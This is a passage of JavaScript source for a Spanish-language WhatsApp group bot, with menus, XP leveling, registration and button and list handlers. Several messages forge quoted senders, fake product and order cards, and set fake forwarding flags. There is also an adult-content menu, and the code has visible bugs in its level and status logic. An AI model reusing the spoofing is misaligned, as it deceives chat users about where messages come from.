(id == null || id == undefined || id == false) ? leo.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : leo.sendMessage(from, teks.trim(), extendedText, {quoted: choute, contextInfo: {"mentionedJid": memberr}})
}

const mentionas = (teks, memberr, id) => {
  (id == null || id == undefined || id == false) ? leo.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : leo.sendMessage(from, teks.trim(), extendedText, {quoted: choute, contextInfo: {"mentionedJid": memberr, "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
  {"title": `Hola ${pushname} 👋🏻`, 
    "body": `HOLA`, "mediaType": 2, 
    "thumbnail": fs.readFileSync(`media/imagen/youtube-min.jpg`), 
    mediaUrl: "https://youtu.be"}}})}



    const ts = `Debes de Activar los comandos para adultos antes de poder usar este comando, se activa usando ${prefix}c18 on`


const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

let i = []
let giid = []
for (mem of totalchat){
  i.push(mem.jid)
}
for (id of i){
  if (id && id.includes('g.us')){
    giid.push(id)
  }
}
var { device_manufacturer,  device_model, mcc, mnc, os_version, cpu, batterylevel, os_build_number, wa_version, phoneId  } = leo.user.phone


//if (isMultiPrefix) {		
  //var prefix = /^[°•π,÷×¶∆*£¢€¥®™✓=|~zZ+×!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷,*×¶∆£¢€¥®™✓=|~zZ+×!#$,|`÷?;:%abcdefghijklmnopqrstuvwxyz%^&./\\©^]/gi) : '-'
  //}


    
    const usedCommandRecently = new Set()
    
    const isImage = type == 'imageMessage'
    const isVideo = type == 'videoMessage'
    const isAudio = type == 'audioMessage'
    const isSticker = type == 'stickerMessage'
    const isContact = type == 'contactMessage'
    const isLocation = type == 'locationMessage'
    const isMedia = (type === 'imageMessage' || type === 'videoMessage')
    const isTexto = type == 'textMessage'

    typeMessage = body.substr(0, 50).replace(/\n/g, '')
      if (isImage) typeMessage = "Image"
      else if (isVideo) typeMessage = "Video"
      else if (isAudio) typeMessage = "Audio"
      else if (isSticker) typeMessage = "Sticker"
      else if (isContact) typeMessage = "Contact"
      else if (isLocation) typeMessage = "Location"
      else if (isTexto) typeMessage = "text"

      const isQuoted = type == 'extendedTextMessage'
      const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')
      const isQuotedImage = isQuoted && typeQuoted == 'imageMessage'
      const isQuotedVideo = isQuoted && typeQuoted == 'videoMessage'
      const isQuotedAudio = isQuoted && typeQuoted == 'audioMessage'
      const isQuotedSticker = isQuoted && typeQuoted == 'stickerMessage'
      const isQuotedContact = isQuoted && typeQuoted == 'contactMessage'
      const isQuotedLocation = isQuoted && typeQuoted == 'locationMessage'


const nivelActual = getLevelingLevel(sender)
            var rango = 'Aspirante'
            if (nivelActual == 10) {
                rango = '*Aprendiz*'
            } else if (nivelActual == 20) {
                rango = '*Novato*'
            } else if (nivelActual == 30) {
                rango = '*Promesa*'
        } else if (nivelActual == 30) {
                rango = '*Profesional*'
            } else if (nivelActual == 100) {
                rango = '*Veterano*'
            } else if (nivelActual == 150) {
                rango = '*Elite*'
            } else if (nivelActual > 200) {
                rango = '*Elite Global🗡*'
            }

            const sendFileFromUrl = async(link, type, options) => {
              hasil = await getBuffer(link)
            leo.sendMessage(from, hasil, type, options).catch(e => {
            fetch(link).then((hasil) => {
            leo.sendMessage(from, hasil, type, options).catch(e => {
            leo.sendMessage(from, { url : link }, type, options).catch(e => {
              reply('_[ ! ] Error al descargar el archivo_')
              console.log(e)
            })
            })
            })
            })
            }

      const sendMediaURL = async(to, url, text="", mids=[]) =>{
      if(mids.length > 0){
          text = mentions(text, mids, true)
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString()
      let mime = ""
      var download = function (uri, filename, callback) {
          request.head(uri, function (err, res, body) {
              mime = res.headers['content-type']
              request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
          });
      };
      download(url, filename, async function () {
          console.log('');
          let media = fs.readFileSync(filename)
          let type = mime.split("/")[0]+"Message"
          if(mime === "image/gif"){
              type = MessageType.video
              mime = Mimetype.gif
          }
          if(mime.split("/")[0] === "audio"){
              mime = Mimetype.mp4Audio
          }
          leo.sendMessage(to, media, type, { quoted: choute, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
          
          fs.unlinkSync(filename)
      });
  }

  const sendFile = async (archivo, nombreDeArchivo, comentario, tag, vn) => {
    tipo = await getBuffer(archivo)
    tipo2 = ''
    if (nombreDeArchivo.includes('m4a')){
    leo.sendMessage(from, tipo, audio,{mimetype: 'audio/mp4',quoted: tag, filename: nombreDeArchivo, ptt: vn})
    }
    if (nombreDeArchivo.includes('mp4')){
  leo.sendMessage(from, tipo, video, {mimetype: 'video/mp4', quoted: tag, caption: comentario, filename: nombreDeArchivo})
    }
    if (nombreDeArchivo.includes('gif')){
    leo.sendMessage(from, tipo, video, {mimetype: Mimetype.gif, caption: comentario, quoted: tag, filename: nombreDeArchivo})
    } 
    if (nombreDeArchivo.includes('png')){
    leo.sendMessage(from, tipo, image, {quoted: tag, caption: comentario, filename: nombreDeArchivo})
    }
  
    if (nombreDeArchivo.includes('webp')){
    leo.sendMessage(from, tipo, sticker, {quoted: tag})
    } else {
    tipo2 = nombreDeArchivo.split(`.`)[1]
    leo.sendMessage(from, tipo, document, {mimetype: tipo2, quoted: tag, filename: nombreDeArchivo})
    }
  }

  const uploadImages = (filePath) => {
    return new Promise(async (resolve, reject) => {
          const fileData = fs.readFileSync(filePath)
          const form = new FormData()
          form.append('file', fileData, 'tmp.png')
          fetch('https://telegra.ph/upload', {
    method: 'POST',
          body: form
          })
          .then(res => res.json())
          .then(res => {
          if (res.error) return reject(res.error)
          resolve('https://telegra.ph' + res[0].src)
          })
          .then(() => fs.unlinkSync(filePath))
          .catch(err => reject(err))
    })
    }

  if (!public) {
    mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
    mods.indexOf(owner) === -1 ? mods.push(owner) : false
    if (!mods.includes(senderNumber)) return
    mods.slice(mods.indexOf(owner), 1)
    }   

    if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
 
    
const jm = moment.tz('America/Santo_Domingo').format('HH:mm:ss')  
const hora = moment.tz('America/Santo_Domingo').format('HH:mm:ss') 
let d1 = new Date
let locale1 = 'es'
let gmt1 = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let ayer = ['domingo','lunes','Martes','Miercoles','Jueves','Viernes','Sabado'][
Math.floor(((d1 * 1) + gmt1) / 84600000) % 7]
let week1 = d1.toLocaleDateString(locale1, { weekday: 'long' })
let calender1 = d1.toLocaleDateString(locale1, {
day: 'numeric',
month: 'long',
year: 'numeric'
})  





if (isOwner) {
	var tipoDeUsr = '*🔮Ownwer*'
	} else if (sender == isAdmin) {
	var tipoDeUsr = '*👑Admin*'
	 } else {
	var tipoDeUsr = '*Normal*'
	}
	
  //FUNCION
  if (isWelkom) {
    var estadowelcom = 'Si'
  } else if (!isWelkom) {
    var estadowelcom = 'No'
  }

  if (isAntiFake) {
    var estadofake = 'NO'
  } else if (!isAntiFake) {
    var estadofake = 'Si'
  }

  if (isAntiLink) {
    var estadolink = 'Si'
  } else if (!isAntiLink) {
    var estadolink = 'No'
  }

  if (isBan) {
    var estadolink = 'Si'
  } else if (!isBan) {
    var estadolink = 'No'
  }

  if (public) {
    var estadop = 'Publico'
  } else if (!public) {
    var estadop = 'Privado'
  }

 
//const requiredXp = 5 * Math.pow(getLevel) + 50 * getLevel + 100


	if (!choute.key.fromMe) {
        if (!isBan) {
	const currentLevel = getLevelingLevel(sender)
	const checkId = getLevelingId(sender)
	try {
	if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
	const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 15) 
	const requiredXp = 5 * Math.pow(currentLevel, (5 / 2)) + 50 * currentLevel + 100
	const getLevel = getLevelingLevel(sender)



	const namelv = checkId
	addLevelingXp(sender, amountXp)
	if (requiredXp <= getLevelingXp(sender)) {
	addLevelingLevel(sender, 1)
  if (!isAutolevel) return
	await leo.sendMessage (from, `
    *HAZ SUBIDO DE NIEL*
👤 *Nombre* : ${pushname}
☎️ *Número* : ${namelv.split("@")[0]}
🎗️ *Nivel*  ${getLevel} ➫ ${getLevelingLevel(sender)}
✨ XP: ${getLevelingXp(sender)} /
🎗️ Rango: ${nivelActual}
`, text, {quoted: choute,  contextInfo: { mentionedJid: [sender]}})}
	} catch (err) {
	console.error(err)
	}
	}
	}
  

const horap = moment().format('HH')
var timeFt = 'Buenas'
if (horap >= '01' && horap <= '05') {
  timeFt = 'Buenos Madrugadas☀️'
} else if (horap >= '05' && horap <= '10') {
  timeFt = 'Buenos dias☀️'
} else if (horap >= '10' && horap <= '14') {
  timeFt = '*Buenos dias🌅*'
} else if (horap >= '14' && horap <= '17') {
  timeFt = 'Buenas tardes🌇'
} else if (horap >= '17' && horap <= '18') {
  timeFt = 'Buenas tardes🌇'
} else if (horap >= '18' && horap <= '23') {
  timeFt = 'Buenas noches🌃'
} 

const chr = {
  key: {
  fromMe: false,
  participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
  },
  message: {
  "productMessage": {
  "product": {
  "productImage":{
  "mimetype": "image/jpeg",
  "jpegThumbnail": fs.readFileSync(`./media/imagen/joy.jpg`)
  },
  "title": `${yo} | 𝑩𝒂𝒃𝒚𝑩𝒆𝒄𝒉𝒐𝒔𝒐`,
  "description": "",
  "currencyCode": "L&J",
  "priceAmount1000": "9999999999999999",
  "retailerId": "",
  "productImageCount": 999
  },
  "businessOwnerJid": `0@s.whatsapp.net`
  }
  }
  }
  contextInfo: {
  mentionedJid: [sender]}


const texto11 = `

╭━─━─≪☁️≫─━─━╮
          ✧☆∵✧☆  
          «${yo}☁︎»    
          ✧☆∵✧☆
╰━─━─☾︎🌊☽︎─━─━╯`
const cmenu = `
╔╦══• •✠•❀•✠ • •══╦╗
    🇯🇵💮 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 💮🇯🇵 
╚╩══• •✠•❀•✠ • •══╩╝
▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀
Buenas tardes🌇 _@${sender.split('@')[0]}_
▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀

||- *_-DATOS DEL USUARIO-_*
[💈] Usuario: _@${sender.split('@')[0]}_
[💈] XP: _${getLevelingXp(sender)}_
[💈] Nivel: _${getLevel1}_

||- *_-INFO DEL GRUPO-_*
[💈] Nombre: _${groupMetadata.subject}_
[💈] Administradores: _${groupAdmins.length}_
[💈] Miembros: _${groupMembers.length - groupAdmins.length }_
[💈] Total de Participantes: _${groupMembers.length}_

||- *_-INFO DEL BOT-_*
[💈] Creador: @${ownerNumber.split('@')[0]}
[💈] Prefijo: "${prefix}"
[💈] Estado del Bot: ${estadop}
[💈] Hora: ${jm}
[💈] Velocidad: ${process.uptime()} 
[💈] Usuarios Registrados: ${_registered.length}
[💈] Usuarios Baneados: ${ban.length}
[💈] Chat Totales: ${totalchat.length}
[💈] Hora: ${hora}
[💈] Fecha: ${week1}  ${calender1}
[💈] Dispositivo: _${leo.user.phone.device_manufacturer}_
[💈] Servidor: ${leo.browserDescription[0]}
[💈] Version de WhatsApp: ${leo.browserDescription[2]}
[💈] Navedador: ${leo.browserDescription[1]}

||- *_-LISTA DE MENUS-_*
[💈] ${prefix}menugrupo
[💈] ${prefix}menuadmin
[💈] ${prefix}menumedia
[💈] ${prefix}menulogo
[💈] ${prefix}entretenimiento
[💈] ${prefix}creador
[💈] ${prefix}credito
[💈] ${prefix}menuowner
[💈] ${prefix}labiblia
`

const nivel = `
👤 *Nombre* : ${pushname}
☎️ *Número* : @${sender.split("@")[0]}
🎖️ *Nivel* : ${nivelActual} ⏭️ ${getLevelingLevel(sender)}
✨ XP: ${getLevelingXp(sender)} / ${getLevelingXp(sender)}` 
const texto = `⚊⚊⚊⚊⚊✬✥✬⚊⚊⚊⚊⚊}
      ༻▫️ 𝒯𝒽𝑒 𝒞𝒽𝑜𝓊𝓉𝑒 ▫️༺
⚊⚊⚊⚊⚊✬✥✬⚊⚊⚊⚊⚊
• • • • • • • • •「◆」• • • • • • • • •
_Si el bot presenta algun fallo, notificarlo a @${ownerNumber.split('@')[0]}_
• • • • • • • • • • • • • • • • • • • • •`

const base = `INFO DE MI CREADOR

*Youtube:*
https://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1

*Instagram:*
https://www.instagram.com/the_choute_/

*Github:*
https://github.com/Thechoute`

const infobot =`||- *_-DATOS DEL BOT-_*
[📱] Creador: @${ownerNumber.split('@')[0]}
[📱] Prefijo: "${prefix}"
[📱] Estado del Bot: ${estadop}
[📱] Usuarios Registrados: ${_registered.length}
[📱] Usuarios Baneados: ${ban.length}
[📱] Dispositivo: ${device_manufacturer}
[📱] Velocidad ${process.uptime()} 

||- *_-DATOS DEL DISPOSITIVO-_*
[📱] Hora: ${hora}
[📱] Fecha: ${week1}  ${calender1}
[📱] Chat Privado: ${giid.length}
[📱] Chat de Grupos:  ${totalchat.length - giid.length}
[📱] Chat Totales: :${totalchat.length}
[📱] Nivel de Bateria: {}
[📱] Cargando?: {}
[📱] Modelo: ${device_model}
[📱] Android: ${os_version} 
[📱] Ram: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
[📱] Servidor: ${leo.browserDescription[0]}
[📱] Navegador: ${leo.browserDescription[1]}

[📱] Version de WhatsApp: ${leo.browserDescription[2]}
`
const infocreador = `${timeFt} @${sender.split('@')[0]}
_Acontinuacion te muestro, mi creador, de preferencia solo hablare si necesitas algo :D_

☎️ *Número* : @${ownerNumber.split("@")[0]}
🌐 *Instagram* : ${instagram}
🌐 *Github:* ${Githu}
🌐 *Youtube:* youtube.com/c/thechout`

const registro = `
*PORFAVOR ESCRIBE BIEN EL FORMATO DE REGISTRO:* 
${prefix}reg *Nombre|Edad* 
Con el *|* que los divide.
`
const menue = `▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀
*- ${timeFt} @${sender.split("@")[0]}.* 
Si tienes dudas o necesitas alguna ayuda siempre le puedes hablar a mi creador @${ownerNumber.split("@")[0]}.
▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀
De preferencia solo hablare si realmente necesitas algo.

♻️ *DATOS DEL GRUPO*
[💈] Nombre: _${groupMetadata.subject}_
[💈] Administradores: _${groupAdmins.length}_
[💈] Miembros: _${groupMembers.length - groupAdmins.length }_
[💈] Total de Participantes: _${groupMembers.length}_
`

const allmenu = 
`
╔─━━━░★░━━━━╗
        *MENU OFICIAL*
        𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊
╚─━━━░★░━━━─╝

¤ = ~ ~ ◉ ~~ = ¤.•♫•♬•♬•♫•.
${timeFt} @${sender.split('@')[0]}

Hoy es ${week1} ${calender1}

.•♫•♬•♬•♫•.¤ = ~ ~ ◉ ~~ = ¤

||- *_-INFO DEL BOT-_*

[🔰] Creador: @${ownerNumber.split('@')[0]}
[🔰] Prefijo: "${prefix}"
[🔰] Velocidad: ${process.uptime()} 
[🔰] Servidor: ${leo.browserDescription[0]}
[🔰] Navegador: ${leo.browserDescription[1]}
[🔰] Chat Privado: ${giid.length}
[🔰] Chat de Grupos:  ${totalchat.length - giid.length}
[🔰] Chat Totales: :${totalchat.length}

||- *_-INFO DEL DISPOSITIVO-_*
[🔰] Dispositivo: ${device_manufacturer}s
[🔰] Modelo: ${device_model}
[🔰] Android: ${os_version} 
[🔰] Ram: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
[🔰] Hora: ${hora}
[🔰] Fecha: ${week1}  ${calender1}

_MENU EN REMODELACION_

${menual}`

const nuevo = `
||- *_-LO NUEVO-_*
Mas de 100 comandos nuevos
Gran Variedad de comandos para fanes del anime
Serbot
Comandos +18
AutoSticker

*NOTA:*
Los errores de play y logos ya estan solucionado, si el bot les presenta alguna falla notificar a @${ownerNumber.split('@')[0]}`
    ///Baby
  baby = {
    wait: '*EN PROCESO*',
    success: '*LISTO PANA*',
    ferr: 'Intentalo de nuevo mas tarde',
    error: {
    stick: 'Mmmmm',
    Iv: 'Mmmmm'
    },
    only: {
        group: 'Este comando solo puede ser usado en grupos.',
        benned: 'Eres un usario *BANEADO* no puedes usar el bot',
        ownerG: 'Este comando solo puede ser utilizado por el creador del grupo',
        ownerB: 'Este comandos solo puede ser utilizado desde el numero del bot',
        admin: 'Este comando es solo para administradores del grupo',
        Badmin: 'Botcito debe ser admin para poder usar este comando',
        usrReg: `No estas registrado para registrarte utiliza\n${prefix}reg\n\n*Ejemplo:*\n\n${prefix}reg Thechoute|14`
      }
    }

//#sticker			





if (choute.message.buttonsResponseMessage){
  test = choute.message.buttonsResponseMessage.selectedButtonId
  if (test.includes(`sex`)){
    reply('*Cargando Proceso de Instalacion*\nPorfavor esperar.')
    leo.sendMessage(from, `${install}`, MessageType.text, {quoted: choute, caption: `El video sera subido pronto en el canal de `, contextInfo: {"forwardingScore": 508, "isForwarded": true, "externalAdReply": 
    {"title": `Hola ${pushname} 👋🏻`, 
    "body": `MIRA EL VIDEO COMPLETO`, "mediaType": 2, 
    "thumbnail": fs.readFileSync(`media/imagen/youtube-min.jpg`), 
    mediaUrl: "https://www.youtube.com/watch?v=Uv8U9VChJHo&t"}}}) 
    addFilter(from)
      addLevelingLevel(sender, 5)	}}         

if (choute.message.buttonsResponseMessage){
test = choute.message.buttonsResponseMessage.selectedButtonId
if (test.includes(`grupo`)){
  leo.sendMessage(from, `
  *-Te invito a unirte al grupo de WhatsApp donde:-*
  
  💭:Se avisa sobre nuevas actualizaciones 
  
  💭:Puedes probar tu propio bot
  
  💭:Se ayuda a quienes tengas problemas
  
  Grupo 1 : 
  _https://chat.whatsapp.com/KOmt1i9738c2zA1SnSLwn1_
  
  Grupo 2 : 
  _https://chat.whatsapp.com/GQnptaCf21IEvLJ69RPT4a_`, MessageType.text, {quoted: choute})
  addFilter(from)
    addLevelingLevel(sender, 5)	}}

if (choute.message.buttonsResponseMessage){
test = choute.message.buttonsResponseMessage.selectedButtonId
if (test.includes(`nuevo`)){
  fansh = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 0, "totalAmount1000" : '1000', "message": `${nuevo}\n\n\nCreador is 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail": fs.readFileSync('./media/imagen/Faketumber.jpg'), "surface": 'CATALOG', "orderTitle": 'Sexo'}}, {contextInfo: { mentionedJid: [sender, ownerNumber]}, quoted:choute, })
  leo.relayWAMessage(fansh)
  addFilter(from)
    addLevelingLevel(sender, 5)	}}


    if (choute.message.buttonsResponseMessage){
      test = choute.message.buttonsResponseMessage.selectedButtonId
      if (test.includes(`mlq`)){
        if (!isRegister) return leoply(baby.only.usrReg)
        let lista = leo.prepareMessageFromContent(from,{
        "listMessage": {
        "description": `${menue}`,
        "buttonText": "Selecciona tu menu",
        "listType": "SINGLE_SELECT",
        "sections": [
        { "title": `Menu Basico`,
        "rows": [
        {
        "title": 'Mi Perfil',
        "rowId": `miperfi`
        },
        {
        "title": 'Recomendaciones',
        "rowId": `recomendaciones`
        },
        {
        "title": 'Menu Completo',
        "rowId": `allmenu`
        },
        ]
        },
        { "title": `Lista de Menus`,
        "rows": [
        {
        "title": 'Menu de sticker',
        "rowId": `sticke`
        },
        {
        "title": 'Menu de Grupos',
        "rowId": `grupos`
        },
        {
        "title": 'Administradores',
        "rowId": `admin`
        },
        {
        "title": 'Owner / Dueño Del Bot',
        "rowId": `menuowner`
        },
        {
        "title": 'Descargas/Multimedia',
        "rowId": `menumedia`
        },
        {
        "title": 'Juegos/Entretenimiento',
        "rowId": `entrenimiento`
        },
        {
        "title": 'Logos',
        "rowId": `Logos`
        },
        {
        "title": 'Menu +18',
        "rowId": `m18`
        },   
        ]
        },        
        {
        "title": `🔖 Créditos / Creador 🔮 `,
        "rows": [
        {
        "title": ' 🔮 Creador',
        "rowId": `creador`
        },
        {
        "title": 'Donacion / Agradecimiento',
        "rowId": `agradecimiento`
        },
        ]    
        },
        {
        "title": `Youtube`,
        "rows": [
        {
        "title": 'Como Instalar Este Bot',
        "rowId": `install`
        },
        ]    
        }
        ],
        }
        },
          {quoted: janza, contextInfo: { mentionedJid: [sender,ownerNumber]}})
        leo.relayWAMessage(lista, {waitForAck: true})  
        addFilter(from)
        addLevelingLevel(sender, 5)	}}

//Perfil
if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`miperfi`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)
  uptime = process.uptime()
    try {
    ppimg = await leo.getProfilePicture(`${sender.split('@')[0]}@c.us`)
    } catch {
    ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'
    }
    tu = await leo.getStatus(`${sender.split('@')[0]}@c.us`, MessageType.text)
    
    teks = 

`👤 *Nombre* : ${pushname}
☎️ *Número* : @${sender.split("@")[0]}
🌐 *Link* : wa.me/${sender.split("@")[0]}
🗣️ *Tipo de Usuario* : ${tipoDeUsr}
⚙️ *Nivel* : ${getLevel1}
🎖️ *Rango* : ${rango}
📋 *INFO:* ${tu.status}
`
its = await getBuffer (ppimg)
    leo.sendMessage(from,  its, image, {thumbnail:fs.readFileSync('./media/imagen/Faketumber.jpg'), quoted: choute, caption: teks, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
    {"title": 'Cuenta de Instagram',       
    "body": 'Sigueme en Instagram',  
    "thumbnail": fs.readFileSync('./media/imagen/instagram.png'),
    "sourceUrl": 'https://www.instagram.com/the_choute_/'}}})
      addFilter(from)  
  addLevelingLevel(sender, 5)	}}

//Reglas
if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`recomendaciones`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)
tampa = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": `${reglas}`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail": fs.readFileSync('./media/imagen/imgregla.jpg'), "surface": 'CATALOG' }}, {contextInfo: { mentionedJid: [sender,ownerNumber]}, quoted:choute, })
leo.relayWAMessage(tampa)
  addFilter(from)
  addLevelingLevel(sender, 5)	}}

//Menu admin
if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`grupos`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)
  reply(`${texto}\n${grupos}`)
  addLevelingLevel(sender, 5)	}}

//Menu admin
if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`admin`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)
  reply(`${texto}\n${admin}`)
  addLevelingLevel(sender, 5)	}}

//Menu completo
if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`allmenu`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)    
  reply('Cargando Menu Completo, No Hagas Spam')            
  txtt =
  `${texto}\n${allmenu}`
    buttons1 = [{buttonId:`grupo`,buttonText:{displayText: 'Grupo de WhatsApp'},type:1},]
    imageMsg = (await leo.prepareMessageMedia(fs.readFileSync(`./media/imagen/bot-baby.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
    buttonsMessage = {
    contentText: `${txtt}`,
    footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
    buttons: buttons1,
    headerType: 4}
    all = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute, contextInfo: { mentionedJid: [sender,ownerNumber]} })
    leo.relayWAMessage(all)
  addFilter(from)
  addLevelingLevel(sender, 5)	}}


  //COMANDOS SIN CATEGORIA
  if (choute.message.listResponseMessage){
    test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
    if (test.includes(`sticke`)){
    leo.updatePresence(from, Presence.composing)
    if (!isRegister) return leoply(baby.only.usrReg)    
    fansh = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 0, "totalAmount1000" : '1000', "message": `${menusticker}\n\n\nCreador is 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail": fs.readFileSync('./media/imagen/cosplay/25.jpg'), "surface": 'CATALOG', "orderTitle": 'Sexo'}}, {contextInfo: { mentionedJid: [sender]}, quoted:choute, })
    leo.relayWAMessage(fansh)
    addFilter(from)
    addLevelingLevel(sender, 5)	}}
  
  //MENU OWNER
  if (choute.message.listResponseMessage){
test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
if (test.includes(`menuowner`)){
leo.updatePresence(from, Presence.composing)
if (!isRegister) return leoply(baby.only.usrReg)
uptime = process.uptime()
leo.sendMessage(from, fs.readFileSync('./media/imagen/cower.jpg') , MessageType.image, {caption: `${texto}\n${owener}`, quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })  
addFilter(from)
addLevelingLevel(sender, 5)	}}
  //MENU MEDIA
  if (choute.message.listResponseMessage){
    test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
    if (test.includes(`menumedia`)){
    leo.updatePresence(from, Presence.composing)
    if (!isRegister) return leoply(baby.only.usrReg)
    uptime = process.uptime()
    reply('Cargando Menu Multimedia...')
    leo.sendMessage(from, fs.readFileSync('./media/imagen/multimedia.jpg') , MessageType.image, {caption: `${texto}\n${multimedia}`, quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })  
    addFilter(from)
    addLevelingLevel(sender, 5)	}}

  //MENU Entretnimiento
  if (choute.message.listResponseMessage){
    test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
    if (test.includes(`entrenimiento`)){
    leo.updatePresence(from, Presence.composing)
    if (!isRegister) return leoply(baby.only.usrReg)
    uptime = process.uptime()
    fansh = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999999999999999999, "totalAmount1000" : '1000', "message": `${texto}\n${entrete}`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail": fs.readFileSync('./media/imagen/izu.jpg'), "surface": 'CATALOG', "orderTitle": 'Sexo'}}, {contextInfo: { mentionedJid: [sender]}, quoted:choute, })
    leo.relayWAMessage(fansh)
    addFilter(from)
    addLevelingLevel(sender, 5)	}}
    //Logo
  if (choute.message.listResponseMessage){
    test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
    if (test.includes(`Logos`)){
    leo.updatePresence(from, Presence.composing)
    if (!isRegister) return leoply(baby.only.usrReg)
    uptime = process.uptime()
    leo.sendMessage(from, fs.readFileSync(`media/imagen/baby.png`), image, {quoted: choute, caption:`🔥 𝑳𝑰𝑺𝑻𝑨 𝑫𝑬 𝑳𝑶𝑮𝑶𝑺 🔥 \n${texto}\n${logos}`})  
    addFilter(from)
    addLevelingLevel(sender, 5)	}}

    if (choute.message.listResponseMessage){
      test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
      if (test.includes(`m18`)){
      leo.updatePresence(from, Presence.composing)
      if (!isRegister) return leoply(baby.only.usrReg)
      uptime = process.uptime()
        leo.sendMessage(from,  fs.readFileSync('./media/imagen/M18.jpg'), image, {thumbnail:fs.readFileSync('./media/imagen/fake18.jpg'), quoted: choute, caption: `${m18}`, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
        {"title": 'Uso Bajo Su Responsabilidad',       
        "body": 'descripción',  
        "thumbnail": fs.readFileSync('./media/imagen/d.jpg'),
        "sourceUrl": 'https://chat.whatsapp.com/KOmt1i9738c2zA1SnSLwn1'}}})

      }}
  
//CREDOR
if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`creador`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)
  uptime = process.uptime()
  leo.sendMessage(from, `${infocreador}`, MessageType.text, {quoted: choute, contextInfo: { mentionedJid: [sender,ownerNumber]}})

  addFilter(from)
  addLevelingLevel(sender, 5)	}}

//AGRADECIMIENTO
if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`agradecimiento`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)
  uptime = process.uptime()
  txtt =
`${agra}`
